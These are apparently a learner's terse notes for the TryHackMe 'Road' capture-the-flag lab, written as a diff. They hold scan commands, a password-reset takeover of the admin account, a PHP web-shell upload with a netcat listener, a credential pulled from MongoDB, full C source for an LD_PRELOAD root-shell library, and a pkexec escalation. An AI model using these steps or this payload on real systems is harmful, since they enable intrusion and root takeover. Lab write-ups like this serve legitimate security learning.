@@ -1,0 +1,171 @@
+nmap -sSVC -Pn -vv 10.10.162.252                                                                                              1 ⨯
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 e6:dc:88:69:de:a1:73:8e:84:5b:a1:3e:27:9f:07:24 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXhjztNjrxAn+QfSDb6ugzjCwso/WiGgq/BGXMrbqex9u5Nu1CKWtv7xiQpO84MsC2li6UkIAhWSMO0F//9odK1aRpPbH97e1ogBENN6YBP0s2z27aMwKh5UMyrzo5R42an3r6K+1x8lfrmW8VOOrvR4pZg9Mo+XNR/YU88P3XWq22DNPJqwtB3q4Sw6M/nxxUjd01kcbjwd1d9G+nuDNraYkA2T/OTHfp/xbhet9K6ccFHoi+A8r6aL0GV/qqW2pm4NdfgwKxM73VQzyolkG/+DFkZc+RCH73dYLEfVjMjTbZTA+19Zd2hlPJVtay+vOZr1qJ9ZUDawU7rEJgJ4hHDqlVjxX9Yv9SfFsw+Y0iwBfb9IMmevI3osNG6+2bChAtI2nUJv0g87I31fCbU5+NF8VkaGLz/sZrj5xFvyrjOpRnJW3djQKhk/Avfs2wkZ+GiyxBOZLetSDFvTAARmqaRqW9sjHl7w4w1+pkJ+dkeRsvSQlqw+AFX0MqFxzDF7M=
+|   256 6b:ea:18:5d:8d:c7:9e:9a:01:2c:dd:50:c5:f8:c8:05 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNBLTibnpRB37eKji7C50xC9ujq7UyiFQSHondvOZOF7fZHPDn3L+wgNXEQ0wei6gzQfiZJmjQ5vQ88vEmCZzBI=
+|   256 ef:06:d7:e4:b1:65:15:6e:94:62:cc:dd:f0:8a:1a:24 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPv3g1IqvC7ol2xMww1gHLeYkyUIe8iKtEBXznpO25Ja
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-title: Sky Couriers
+|_http-favicon: Unknown favicon MD5: FB0AA7D49532DA9D0006BA5595806138
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+ffuf -u http://road.thm/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,302
+
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://road.thmFUZZ -e .aspx,.html,.php,.txt -mc 200,302
+
+gobuster dir -u http://road.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t 50 -x php,html,txt
+
+register account --> upload images
+...
+Right now, only admin has access to this feature. Please drop an email to admin@sky.thm in case of any changes. 
+
+
+burp suite
+open brower
+reset user ---> with newpasswor is admin
+change user to admin@sky.thm  --> forward
+login with account admin@sky.thm:admin
+
+upload file shell.php
+change ip
+
+view-source:http://road.thm/v2/profile.php
+....
+<!-- /v2/profileimages/ -->
+.....
+
+http://10.10.162.252/v2/profileimages/shell.php
+
+or curl 10.10.162.252/v2/profileimages/shell.php
+
+nc -lnvp 1234
+python3 -c 'import pty; pty.spawn ("/bin/bash")'
+ls /home
+webdeveloper
+www-data@sky:/$ ls /home/webdeveloper
+ls /home/webdeveloper
+user.txt
+www-data@sky:/$ cat /home/webdeveloper/user.txt
+cat /home/webdeveloper/user.txt
+63191e4ece37523c9fe6bb62a5e64d45
+www-data@sky:/$ ss -tulpn
+Netid State  Recv-Q Send-Q      Local Address:Port    Peer Address:Port Process 
+udp   UNCONN 0      0           127.0.0.53%lo:53           0.0.0.0:*            
+udp   UNCONN 0      0      10.10.162.252%eth0:68           0.0.0.0:*            
+tcp   LISTEN 0      511             127.0.0.1:9000         0.0.0.0:*            
+tcp   LISTEN 0      4096            127.0.0.1:27017        0.0.0.0:*            
+tcp   LISTEN 0      151             127.0.0.1:3306         0.0.0.0:*            
+tcp   LISTEN 0      4096        127.0.0.53%lo:53           0.0.0.0:*            
+tcp   LISTEN 0      128               0.0.0.0:22           0.0.0.0:*            
+tcp   LISTEN 0      70              127.0.0.1:33060        0.0.0.0:*            
+tcp   LISTEN 0      511                     *:80                 *:*            
+tcp   LISTEN 0      128                  [::]:22              [::]:* 
+
+curl 127.0.0.1:27017
+curl 127.0.0.1:27017
+It looks like you are trying to access MongoDB over HTTP on the native driver port.
+
+
+
+Connection to mongdb
+
+Command to connect on DB :
+
+mongo 127.0.0.1
+
+Command to check databases :
+
+show dbs
+shshow dbs
+admin   0.000GB
+backup  0.000GB
+config  0.000GB
+local   0.000GB
+> use backup
+ususe backup
+switched to db backup
+> show collections
+shshow collections
+collection
+user
+> db.user.find()
+dbdb.user.find()
+{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
+{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
+{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "BahamasChapp123!@#" }
+{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
+{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }
+> 
+
+
+"webdeveloper", "Pass" : "BahamasChapp123!@#" }
+
+su webdeveloper
+Password: BahamasChapp123!@#
+
+sudo -l 
+Matching Defaults entries for webdeveloper on sky:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    env_keep+=LD_PRELOAD
+
+User webdeveloper may run the following commands on sky:
+    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
+
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#ld_preload-and-nopasswd
+
+vi shell.c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+void _init() {
+	unsetenv("LD_PRELOAD");
+	setgid(0);
+	setuid(0);
+	system("/bin/sh");
+}
+
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+
+or on my machine compiler
+
+
+$sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
+# whoami
+root
+# ls /root
+root.txt
+# cat /root/root.txt
+cat /root/root.txt
+3a62d897c40a815ecbe267df2f533ac6
+
+OR
+session 1
+echo $$
+32736
+webdeveloper@sky:~$ pkexec /bin/bash
+
+
+session 2
+pkttyagent -p 32736
+==== AUTHENTICATING FOR org.freedesktop.policykit.exec ===
+Authentication is needed to run `/bin/bash' as the super user                                                                         
+Authenticating as: webdeveloper
+Password: 
+==== AUTHENTICATION COMPLETE ===
+
+
+https://tryhackme.com/room/road
+https://wiki.thehacker.nz/docs/thm-writeups/road-medium/ 
+https://theirsecurity.com/thm-writeups/thm-road/
+                                
